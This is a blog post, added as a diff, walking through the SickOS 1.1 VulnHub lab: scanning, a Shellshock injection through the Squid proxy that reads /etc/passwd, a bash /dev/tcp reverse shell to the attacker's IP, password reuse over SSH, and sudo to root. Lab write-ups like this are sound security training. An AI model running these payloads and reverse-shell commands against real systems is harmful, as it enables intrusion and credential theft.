@@ -1,0 +1,129 @@
+---
+layout: post
+title: "sickos:1.1"
+date: 2016-05-18 12:50:37 -0500
+comments: true
+categories: [vulhub, squid]
+---
+
+
+From [Vulhub](https://www.vulnhub.com/entry/csharp-vulnjson,134/)
+
+###Tools:
+
+* netdiscover
+* Nmap
+* Metasploit
+* FoxyProxy
+
+<!--more-->
+
+Use netdiscover to detect target IP address
+
+`netdiscover -i eth0 -r 192.168.79.0/24`
+
+{% img  /images/blog/vulhub/sickos/Selection_001.png   [title manually exploit [alt text]] %}
+
+192.168.79.178 is the target.
+
+Then run nmap to detect opening ports and running services on the target machine.
+
+`nmap -sV -v -O -A -T5 192.168.79.178 -p-`
+
+{% img  /images/blog/vulhub/sickos/Selection_002.png   [title manually exploit [alt text]] %}
+
+Looks like port 22 and port 3218 are openning. the port 3218 is running Squid. open msfconsole, search squid. I found that:
+
+{% img  /images/blog/vulhub/sickos/Selection_003.png   [title manually exploit [alt text]] %}
+
+Then use this module to scan the squid service:
+
+{% img  /images/blog/vulhub/sickos/Selection_004.png   [title manually exploit [alt text]] %}
+
+Looks like port 80 is opened:
+
+{% img  /images/blog/vulhub/sickos/Selection_005.png   [title manually exploit [alt text]] %}
+
+Use FoxyProxy add-on to configure proxy:
+
+{% img  /images/blog/vulhub/sickos/Selection_006.png   [title manually exploit [alt text]] %}
+
+now visit http://192.168.79.178
+
+{% img  /images/blog/vulhub/sickos/Selection_007.png   [title manually exploit [alt text]] %}
+
+now let's use nikto to scan the server:
+
+```
+nikto -h localhost -useproxy http://192.168.79.178:3128
+```
+
+{% img  /images/blog/vulhub/sickos/Selection_008.png   [title manually exploit [alt text]] %}
+
+looks like there is a shellshock vuln
+
+
+Let's test it:
+
+
+```
+wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" -e use_proxy=on -e http_proxy=192.168.79.178:3128 "http://192.168.79.178/cgi-bin/status"
+
+```
+
+{% img  /images/blog/vulhub/sickos/Selection_009.png   [title manually exploit [alt text]] %}
+
+It works and looks  there is an account sickos.
+
+Now lets setup reverse shell. 
+
+netcat-style shell access without netcat:
+
+`/bin/bash -i > /dev/tcp/[yourip]/[port] 0<&1`
+
+
+in one terminal:
+
+`nc -nlvp 4444`
+
+in another terminal:
+
+
+```
+wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/bash -i > /dev/tcp/192.168.79.173/4444 0<&1" -e use_proxy=on -e http_proxy=192.168.79.178:3128 "http://192.168.79.178/cgi-bin/status"
+
+```
+
+get the shell:
+
+
+{% img  /images/blog/vulhub/sickos/Selection_010.png   [title manually exploit [alt text]] %}
+
+
+After Enumeration, got a interesting file: `/var/www/wolfcms/config.php`
+
+{% img  /images/blog/vulhub/sickos/Selection_011.png   [title manually exploit [alt text]] %}
+
+
+Looks like the password is `john@123`
+
+SSH to the target server as sickos and use this password:
+
+
+{% img  /images/blog/vulhub/sickos/Selection_012.png   [title manually exploit [alt text]] %}
+
+
+
+Check sickos's privilege:
+
+`sudo -l`
+
+{% img  /images/blog/vulhub/sickos/Selection_013.png   [title manually exploit [alt text]] %}
+
+Looks like it can run as root
+
+
+{% img  /images/blog/vulhub/sickos/Selection_014.png   [title manually exploit [alt text]] %}
+
+
+YES
